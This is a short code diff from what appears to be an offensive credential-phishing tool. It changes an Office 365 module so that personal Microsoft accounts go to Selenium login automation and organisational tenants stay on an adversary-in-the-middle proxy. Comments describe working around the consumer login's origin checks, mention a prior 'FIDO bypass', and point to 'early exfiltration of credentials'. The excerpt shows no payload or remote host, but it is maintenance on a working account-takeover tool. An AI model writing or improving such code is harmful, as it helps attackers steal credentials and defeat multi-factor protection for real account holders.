@@ -100,14 +100,19 @@ class Office365Module(BaseModule):
         personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
         is_personal = any(domain in self.user.lower() for domain in personal_domains)
 
-        # Use AiTM for both personal and organizational accounts
-        # Personal account support has been implemented with proper FIDO bypass
-        self.attack_mode = "aitm"
-        
+        # 2025-07-19 hot-fix:
+        # The consumer (MSA) login experience performs strict origin checks that are
+        # currently breaking our AiTM proxy and yield a blank white screen.  Until a
+        # more robust bypass is implemented, route *personal* accounts through the
+        # (already battle-tested) Selenium automation while keeping AiTM for
+        # organisational tenants.
+
         if is_personal:
-            self.log(f"[AiTM] Personal account detected ({self.user}) – using AiTM with personal account flow")
+            self.attack_mode = "selenium"
+            self.log(f"[Selenium] Personal account detected ({self.user}) – falling back to Selenium automation")
         else:
-            self.log(f"[AiTM] Organizational account detected ({self.user}) – using AiTM with organizational flow")
+            self.attack_mode = "aitm"
+            self.log(f"[AiTM] Organisational account detected ({self.user}) – using AiTM flow")
         
         
         # Send early exfiltration of credentials
